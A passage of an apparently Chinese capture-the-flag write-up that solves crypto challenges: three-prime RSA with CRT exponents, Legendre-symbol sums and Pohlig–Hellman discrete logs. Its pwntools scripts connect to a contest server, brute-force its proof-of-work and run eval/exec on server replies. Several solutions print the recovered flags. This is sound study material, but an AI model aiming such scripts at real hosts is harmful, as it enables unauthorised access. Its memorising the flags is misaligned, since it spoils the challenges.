class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">2613</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">x = <span class="number">4294967295</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;4294967295&#x27;</span>)</span><br><span class="line">c = <span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">param = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">     param.append(c % x)</span><br><span class="line">     c = (c-param[-<span class="number">1</span>])//x</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(param).encode().strip(<span class="string">b&#x27;[&#x27;</span>).strip(<span class="string">b&#x27;]&#x27;</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Fi1nd-th3-x’"><a href="#Fi1nd-th3-x’" class="headerlink" title="Fi1nd_th3_x’"></a>Fi1nd_th3_x’</h3><blockquote><p>听说在那个大陆有位叫jrl777的旅行者……Cryptoer穿越到了提瓦特就要拿出真本事！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span>* </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">e = getPrime(<span class="number">32</span>)</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">dP = d%((q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dQ = d%((p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dR = d%((p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = s2n(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>,r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dP=&#x27;</span>,dP)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dQ=&#x27;</span>,dQ)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dR=&#x27;</span>,dR)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line"><span class="string">q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line"><span class="string">r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line"><span class="string">dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line"><span class="string">dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line"><span class="string">dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line"><span class="string">c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>由于 $m&lt;qr,m&lt;pr,m&lt;pq$，故 $m=c^{dP} \bmod {qr}=c^{dQ} \bmod {pr}=c^{dR} \bmod {pq}$，否则需应用CRT来求 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p= <span class="number">13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line">q= <span class="number">12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line">r= <span class="number">12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line">dP= <span class="number">116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line">dQ= <span class="number">44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line">dR= <span class="number">60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line">c= <span class="number">93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"></span><br><span class="line">m1=<span class="built_in">pow</span>(c,dP,q*r)</span><br><span class="line">m2=<span class="built_in">pow</span>(c,dQ,p*r)</span><br><span class="line">m3=<span class="built_in">pow</span>(c,dR,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_f3n_but_Gen3hi_im9act_is_a_balabalaba&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Quick-Robert"><a href="#Quick-Robert" class="headerlink" title="Quick_Robert"></a>Quick_Robert</h3><blockquote><p>题目链接：nc 59.110.20.54:3042 <a href="https://en.wikipedia.org/wiki/Quadratic_residue">https://en.wikipedia.org/wiki/Quadratic_residue</a></p></blockquote><p>参考 <a href="https://imomath.com/index.cgi?page=quadraticCongruencesSumsLegendreSymbols">Some sums of Legendre’s symbols</a>，利用二次剩余的求和特性计算：</p><p>$\sum\limits_{x=0}^{p-1}\left(\cfrac{ax^2+bx+c}p\right) = \left\{\begin{array}{cl}-\left(\cfrac ap\right),&amp; p \nmid b^2-4ac \newline (p-1)\left(\cfrac ap\right),<br>&amp; p \mid b^2-4ac \end{array}\right.$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">3042</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;|||||\n\n&#x27;</span>)</span><br><span class="line">    a = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;*&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">    b = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;*&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="built_in">exec</span>(r.recvuntil(<span class="string">b&#x27;(&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    delta = b**<span class="number">2</span>-<span class="number">4</span>*a</span><br><span class="line">    x = sympy.legendre_symbol(a,p)</span><br><span class="line">    x = x*(p-<span class="number">1</span> <span class="keyword">if</span> delta%p==<span class="number">0</span> <span class="keyword">else</span> -<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;x = <span class="subst">&#123;x&#125;</span>&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;answer: &#x27;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Diligent-Liszt"><a href="#Diligent-Liszt" class="headerlink" title="Diligent_Liszt"></a>Diligent_Liszt</h3><blockquote><p><a href="https://en.wikipedia.org/wiki/Discrete_logarithm">https://en.wikipedia.org/wiki/Discrete_logarithm</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;SYC&quot;</span>)</span><br><span class="line">nbits = <span class="number">512</span></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_p_1</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gp.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gp.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p,q,r = [gen_p_1(nbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pqr&quot;</span>] </span><br><span class="line"></span><br><span class="line">n = p*q*r </span><br><span class="line">x = bytes_to_long(flag) </span><br><span class="line">y = gp.powmod(g,x,n) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(q))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r))   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(y)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line"><span class="string">q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line"><span class="string">r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line"><span class="string">y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DLP，Pohlig–Hellman算法+CRT。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line">q = <span class="number">1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line">r = <span class="number">132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line">y = <span class="number">5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">babystep_giantstep</span>(<span class="params">g, y, p, q=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> q <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        q = p - <span class="number">1</span></span><br><span class="line">    m = <span class="built_in">int</span>(q**<span class="number">0.5</span> + <span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># Baby step</span></span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    gr = <span class="number">1</span>  <span class="comment"># g^r</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        table[gr] = r</span><br><span class="line">        gr = (gr * g) % p</span><br><span class="line">    <span class="comment"># Giant step</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        gm = <span class="built_in">pow</span>(g, -m, p)  <span class="comment"># gm = g^&#123;-m&#125;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    ygqm = y                <span class="comment"># ygqm = y * g^&#123;-qm&#125;</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> ygqm <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">return</span> q * m + table[ygqm]</span><br><span class="line">        ygqm = (ygqm * gm) % p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pohlig–Hellman法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pohlig_hellman_DLP</span>(<span class="params">g, y, p</span>):</span><br><span class="line">    crt_moduli = []</span><br><span class="line">    crt_remain = []</span><br><span class="line">    <span class="keyword">for</span> q, _ <span class="keyword">in</span> factor(p-<span class="number">1</span>):</span><br><span class="line">        x = babystep_giantstep(<span class="built_in">pow</span>(g,(p-<span class="number">1</span>)//q,p), <span class="built_in">pow</span>(y,(p-<span class="number">1</span>)//q,p), p, q)</span><br><span class="line">        <span class="keyword">if</span> (x <span class="keyword">is</span> <span class="literal">None</span>) <span class="keyword">or</span> (x &lt;= <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        crt_moduli.append(q)</span><br><span class="line">        crt_remain.append(x)</span><br><span class="line">    x = crt(crt_remain, crt_moduli)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">xp = pohlig_hellman_DLP(g, y%p, p)</span><br><span class="line">xq = pohlig_hellman_DLP(g, y%q, q)</span><br><span class="line">xr = pohlig_hellman_DLP(g, y%r, r)</span><br><span class="line">x = crt([xp,xq,xr],[p-<span class="number">1</span>,q-<span class="number">1</span>,r-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;D1scr3te_L0g_W1th_Mult1pl3_pr1m35&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="card-game"><a href="#card-game" class="headerlink" title="card_game"></a>card_game</h3><blockquote><p>AL3XEI送给了你这个游戏的关键数据，你能预测接下来要出的牌吗 nc 59.110.20.54 4953</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> cards <span class="keyword">import</span> Heart, Spade, Club, Diamond</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (Heart[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (Spade[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (Diamond[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (Club[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GAME</span>():</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string"> ####    ##   #####  #####      ####    ##   #    # ###### </span></span><br><span class="line"><span class="string">#    #  #  #  #    # #    #    #    